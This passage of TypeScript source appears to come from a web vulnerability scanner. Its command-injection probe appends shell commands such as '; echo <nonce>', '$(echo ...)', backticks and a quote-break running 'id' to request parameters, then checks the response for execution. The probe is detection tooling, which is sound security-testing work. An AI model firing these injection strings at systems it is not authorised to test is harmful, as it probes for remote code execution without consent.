 * is proven only when the fresh nonce appears in the response while the sent template does not
 * (which rules out plain input reflection).
 */
export async function diffCommandInjection(ctx: DiffContext): Promise<DiffOutcome> {
  const { req, send, anomalies } = ctx
  const baseValue = req.baselineValue ?? (req.paramLocation === 'path' ? '1' : '127.0.0.1')
  const base = await send(injectParam(req, baseValue))
  if (!base) return { verdict: 'inconclusive', summary: 'Baseline request failed.', details: {} }
  const nonce = `gn${randToken(10)}`
  const variants: Array<{ name: string; build: (n: string) => string }> = [
    { name: 'semicolon_echo', build: n => `${baseValue}; echo ${n}` },
    { name: 'subshell_echo', build: n => `${baseValue}$(echo ${n})` },
    { name: 'quote_break', build: n => `${baseValue}"; echo ${n}; "` },
    { name: 'quote_break_id', build: n => `${baseValue}"; id; echo ${n}; "` },
    { name: 'pipe_echo', build: n => `${baseValue} | echo ${n}` },
    { name: 'backtick_echo', build: n => `${baseValue}\`echo ${n}\`` },
  ]
  const results: Array<Record<string, unknown>> = []
  for (const variant of variants) {
    const payload = variant.build(nonce)
    const ex = await send(injectParam(req, payload))
    if (!ex) continue
    const nonceInBody = ex.body.includes(nonce)
    const templateReflected = ex.body.includes(payload)
    const executed = nonceInBody && !templateReflected
    results.push({ variant: variant.name, status: ex.status, nonceInBody, templateReflected, executed })
    if (executed) {
      anomalies.push({
        type: 'command_executed', variant: variant.name, baseValue, nonce, payload,
        status: ex.status, suggestedReplayKind: 'rce_proof',
      })
      return {
        verdict: 'signal',
        summary: `Fresh shell nonce appeared in output for the ${variant.name} variant without template reflection (command executed).`,
        details: { results, baseStatus: base.status, suggestedReplayKind: 'rce_proof' },
      }
    }
  }
  return {
    verdict: 'no_signal',
    summary: 'No command-execution nonce appeared in output across echo variants.',
    details: { results, baseStatus: base.status },
  }
}

export const injectionProbe: ProbeModule = {
  family: 'injection',
  classes: ['sqli_boolean', 'sqli_time_diff', 'ssti_math', 'nosqli_type', 'command_injection'],
  run: (ctx, deps) => {
    switch (ctx.req.probeClass) {
      case 'sqli_boolean': return diffBooleanDifferential(ctx)
      case 'sqli_time_diff': return diffSqlTimeDifferential(ctx, deps.grant)
      case 'ssti_math': return diffTemplateMath(ctx)
      case 'nosqli_type': return diffOperatorTypes(ctx)
      case 'command_injection': return diffCommandInjection(ctx)
      default: return Promise.resolve({ verdict: 'inconclusive', summary: 'Probe class not owned by injection module.', details: {} })
    }
  },
}
